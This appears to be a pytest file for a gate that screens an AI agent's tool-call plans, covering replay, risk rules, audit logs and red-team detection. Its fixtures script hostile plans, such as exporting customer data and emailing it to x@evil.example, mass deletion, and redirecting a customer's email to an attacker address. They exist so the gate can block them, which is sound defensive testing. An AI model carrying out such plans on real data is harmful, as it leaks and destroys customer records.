from fastapi.testclient import TestClient

from app import config
from app.gate.replay import consequence_replay
from app.gate.risk_analyzer import analyze_sequence
from app.main import app
from app.redteam import run_suite
from app.schemas import ActionRequest
from app.storage.database import get_customers, seed_customers

seed_customers()
client = TestClient(app)


def A(tool, **arguments):
    return ActionRequest(tool=tool, arguments=arguments)


def test_replay_never_modifies_real_database():
    before = get_customers()
    result = consequence_replay([A("customer.delete", customer_id=c["id"]) for c in before])
    assert result["impact"]["records_deleted"] == len(before)
    assert result["impact"]["records_after"] == 0
    assert get_customers() == before


def test_replay_detects_exfiltration_and_suggests_safer_plan():
    plan = [
        A("customer.export", destination="external"),
        A("email.send", to="x@evil.example", subject="s", body="b"),
        A("customer.delete", customer_id=1),
    ]
    result = consequence_replay(plan)
    assert result["decision"] == "BLOCK"
    assert result["impact"]["data_left_company"] is True
    safer = result["safer_plan"]
    assert safer and safer["gate"]["decision"] != "BLOCK"
    tools = [a["tool"] for a in safer["actions"]]
    assert "email.send" not in tools and "customer.delete" not in tools


def test_safe_plan_has_no_safer_alternative():
    result = consequence_replay([A("customer.list"), A("customer.read", customer_id=1)])
    assert result["decision"] == "ALLOW"
    assert result["safer_plan"] is None


def test_large_refund_flagged_using_config():
    findings = analyze_sequence([A("refund.process", customer_id=1, amount=config.REFUND_LIMIT + 1)])
    assert any(f["rule"] == "large_refund" for f in findings)
    assert not analyze_sequence([A("refund.process", customer_id=1, amount=config.REFUND_LIMIT)])


def test_email_change_requires_approval():
    res = client.post("/evaluate", json={"actions": [
        {"tool": "customer.update", "arguments": {"customer_id": 1, "field": "email", "value": "a@evil.example"}}
    ]}).json()
    assert res["decision"] == "REQUIRE_APPROVAL"


def test_audit_log_records_decisions():
    before = client.get("/audit/stats").json()["total"]
    client.post("/evaluate", json={"actions": [{"tool": "system.execute", "arguments": {}}]})
    stats = client.get("/audit/stats").json()
    assert stats["total"] == before + 1
    assert client.get("/audit?limit=1").json()[0]["decision"] == "BLOCK"


def test_meta_is_driven_by_backend():
    meta = client.get("/meta").json()
    assert "customer.read" in meta["tools"]
    assert meta["settings"]["refund_limit"] == config.REFUND_LIMIT
    assert meta["example_instructions"]


def test_redteam_detection_rate():
    report = run_suite()
    assert report["detection_rate"] == 100.0
    assert report["false_positive_rate"] == 0.0
